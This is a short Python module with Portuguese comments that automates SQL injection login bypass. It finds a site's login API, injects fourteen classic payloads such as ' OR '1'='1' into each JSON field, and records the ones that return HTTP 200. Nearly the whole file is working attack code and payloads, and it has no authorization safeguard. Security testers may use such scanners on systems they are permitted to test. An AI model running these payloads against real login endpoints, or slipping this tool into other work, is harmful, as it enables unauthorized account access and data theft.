import requests
from playwright.sync_api import sync_playwright
from .network_analisys import find_login_api_url

# Lista de payloads para tentar burlar a injeção SQL em campos de login
bypass_sql_injection_list = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 'a'='a' ({",
    "' OR 'a'='a' /*",
    "' OR '1'='1' LIMIT 1; -- ",
    "' OR '1'='1' LIMIT 1; #",
    "' OR '1'='1' LIMIT 1; /*"
]

def login_test(url, json_login):
    """Realiza o POST de login e retorna o response."""
    try:
        response = requests.post(url, json=json_login)
        return response
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return 

def sql_injection_test(payloads, login_url):
    """Testa cada payload na lista de injeção SQL e retorna os que funcionaram."""

    informations = find_login_api_url(login_url)
    if not informations["url"] or not informations["json_format"]:
        print("Não foi possível encontrar a API de login ou o formato do JSON.")
        return []
    api_url = informations["url"]

    # Lista de bypass que funcionaram
    bypassed_payloads = []

    for key in informations["json_format"].keys():

        for payload in payloads:

            # Cria uma cópia do JSON original e insere o payload
            json_payload = informations["json_format"].copy()
            json_payload[key] = payload

            # Verifica se o login foi bem-sucedido
            response = login_test(api_url, json_payload)
            if response and response.status_code == 200:
                response_json = response.json()
                bypassed_payloads.append((key, payload, response_json))
            
    return bypassed_payloads



